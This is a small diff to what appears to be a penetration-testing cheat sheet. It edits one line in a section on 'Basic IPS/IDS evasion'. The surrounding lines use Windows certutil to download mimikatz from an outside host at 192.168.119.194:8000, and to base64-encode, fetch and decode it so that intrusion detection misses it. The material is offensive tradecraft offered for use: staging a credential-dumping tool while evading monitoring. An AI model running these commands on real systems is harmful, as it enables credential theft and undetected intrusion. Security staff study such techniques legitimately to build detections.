@@ -36,7 +36,7 @@ certutil.exe -urlcache -split -f http://192.168.119.194:8000/mimikatz.exe outpu
 ```
 Encoded transfert - Basic IPS/IDS evasion
 ```
-certutil -encode mimikatz.exe mimikatz.txt
+certutil.exe -encode mimikatz.exe mimikatz.txt
 certutil.exe -urlcache -split -f "http://192.168.119.194:8000/mimikatz.txt" mimikatz.txt
 certutil.exe -decode mimikatz.txt mimikatz.exe
 ```
